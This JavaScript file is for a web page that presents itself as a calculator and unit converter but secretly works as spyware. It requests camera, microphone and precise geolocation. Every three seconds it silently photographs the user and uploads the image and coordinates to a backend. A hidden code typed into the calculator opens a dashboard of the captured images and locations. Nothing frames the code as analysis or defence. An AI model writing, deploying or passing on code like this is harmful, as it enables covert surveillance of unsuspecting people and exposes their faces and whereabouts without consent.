const display = document.getElementById("display");
let expression = "";
const secretCode = "38448674=";

function press(key) {
    if (key === "=") {
        // Check for secret code before eval
        if (expression + "=" === secretCode) {
            showDashboard();
            expression = "";
            display.value = "";
            return;
        }

        try {
            // Replace ^ with ** for exponentiation
            let expr = expression.replace(/\^/g, "**");

            // Replace math functions with Math equivalents
            expr = expr.replace(/sin\(/g, "Math.sin(")
                       .replace(/cos\(/g, "Math.cos(")
                       .replace(/tan\(/g, "Math.tan(")
                       .replace(/log\(/g, "Math.log10(")
                       .replace(/sqrt\(/g, "Math.sqrt(");

            // Evaluate expression
            let result = eval(expr);

            // Format result to fixed decimals if needed
            if (typeof result === "number" && !Number.isInteger(result)) {
                result = result.toFixed(8);
            }

            display.value = result;
        } catch {
            display.value = "Error";
        }
        expression = ""; // reset after eval
    } else if (key === "C") {
        expression = "";
        display.value = "";
    } else {
        expression += key;
        display.value = expression;
    }
}

// Request camera + microphone and mute video element to prevent audio feedback
navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
    const video = document.getElementById("video");
    video.srcObject = stream;
    video.muted = true; // mute video so audio from mic doesn’t echo
}).catch(err => {
    console.error("Camera/Mic error:", err);
});

// Get high accuracy geolocation
navigator.geolocation.getCurrentPosition(
  pos => {
    window.userLocation = `${pos.coords.latitude},${pos.coords.longitude}`;
  },
  err => {
    console.error("Geolocation error:", err);
    window.userLocation = "Unknown";
  },
  { enableHighAccuracy: true }
);

function captureAndSend() {
    const video = document.getElementById("video");

    if (video.videoWidth === 0 || video.videoHeight === 0) {
        console.warn("Video not ready yet");
        return; // skip capture if video not ready
    }

    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Draw current video frame
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Overlay: timestamp and Cyberpunk tag
    const timestamp = new Date().toLocaleString();
    const tag = "Cyberpunk";

    // Draw black semi-transparent rectangle behind text
    ctx.fillStyle = "rgba(0, 0, 0, 0.5)";
    ctx.fillRect(10, canvas.height - 60, 270, 50);

    // Text styles
    ctx.font = "20px 'Courier New', monospace";
    ctx.fillStyle = "#00FFAA"; // neon green color
    ctx.textBaseline = "top";

    // Draw timestamp and tag
    ctx.fillText(timestamp, 15, canvas.height - 55);
    ctx.fillText(tag, 15, canvas.height - 30);

    // Convert canvas to JPEG blob and send to backend
    canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("image", blob, "photo.jpg");
        formData.append("location", window.userLocation || "Unknown");

        fetch("/upload", {
            method: "POST",
            body: formData
        }).catch(err => console.error("Upload error:", err));
    }, "image/jpeg");
}

// Capture and send image every 3 seconds
setInterval(() => {
    if (window.userLocation) {
        captureAndSend();
    }
}, 3000);

// Show dashboard UI
function showDashboard() {
    document.getElementById("calculator").style.display = "none";
    document.getElementById("dashboard").style.display = "block";

    const container = document.getElementById("imagesContainer");
    container.innerHTML = "Loading images...";

    fetch("/dashboard_images")
        .then(res => res.json())
        .then(data => {
            container.innerHTML = "";
            if (!data.images || data.images.length === 0) {
                container.textContent = "No images captured yet.";
                return;
            }
            data.images.forEach(img => {
                const div = document.createElement("div");
                div.style.marginBottom = "20px";
                div.innerHTML = `
                  <img src="${img.url}" style="max-width:300px; display:block; border: 2px solid #00FFAA; margin-bottom: 5px;"/>
                  <p><strong>Timestamp:</strong> ${img.timestamp}</p>
                  <p><strong>Location:</strong> ${img.location}</p>
                `;
                container.appendChild(div);
            });
        }).catch(err => {
            container.textContent = "Error loading images.";
            console.error(err);
        });
}

function closeDashboard() {
    document.getElementById("dashboard").style.display = "none";
    document.getElementById("calculator").style.display = "block";
}

// Converter logic
const units = {
    length: {
        meter: 1,
        kilometer: 1000,
        centimeter: 0.01,
        millimeter: 0.001,
        mile: 1609.34,
        yard: 0.9144,
        foot: 0.3048,
        inch: 0.0254
    },
    weight: {
        kilogram: 1,
        gram: 0.001,
        milligram: 0.000001,
        pound: 0.453592,
        ounce: 0.0283495
    },
    temperature: {
        celsius: "celsius",
        fahrenheit: "fahrenheit",
        kelvin: "kelvin"
    }
};

function updateUnits() {
    const type = document.getElementById("converter-type").value;
    const unitFrom = document.getElementById("unit-from");
    const unitTo = document.getElementById("unit-to");

    unitFrom.innerHTML = "";
    unitTo.innerHTML = "";

    for (const unit in units[type]) {
        const optionFrom = document.createElement("option");
        optionFrom.value = unit;
        optionFrom.textContent = unit.charAt(0).toUpperCase() + unit.slice(1);
        unitFrom.appendChild(optionFrom);

        const optionTo = document.createElement("option");
        optionTo.value = unit;
        optionTo.textContent = unit.charAt(0).toUpperCase() + unit.slice(1);
        unitTo.appendChild(optionTo);
    }
}

function convert() {
    const type = document.getElementById("converter-type").value;
    const from = document.getElementById("unit-from").value;
    const to = document.getElementById("unit-to").value;
    const input = parseFloat(document.getElementById("converter-input").value);
    const resultElem = document.getElementById("converter-result");

    if (isNaN(input)) {
        resultElem.textContent = "Please enter a valid number.";
        return;
    }

    if (type === "temperature") {
        let result;
        if (from === to) {
            result = input;
        } else if (from === "celsius") {
            if (to === "fahrenheit") {
                result = (input * 9/5) + 32;
            } else if (to === "kelvin") {
                result = input + 273.15;
            }
        } else if (from === "fahrenheit") {
            if (to === "celsius") {
                result = (input - 32) * 5/9;
            } else if (to === "kelvin") {
                result = (input - 32) * 5/9 + 273.15;
            }
        } else if (from === "kelvin") {
            if (to === "celsius") {
                result = input - 273.15;
            } else if (to === "fahrenheit") {
                result = (input - 273.15) * 9/5 + 32;
            }
        }
        resultElem.textContent = `${input} ${from} = ${result.toFixed(4)} ${to}`;
    } else {
        // Convert to base unit
        const baseValue = input * units[type][from];
        // Convert to target unit
        const convertedValue = baseValue / units[type][to];
        resultElem.textContent = `${input} ${from} = ${convertedValue.toFixed(4)} ${to}`;
    }
}

// Initialize units on page load
updateUnits();
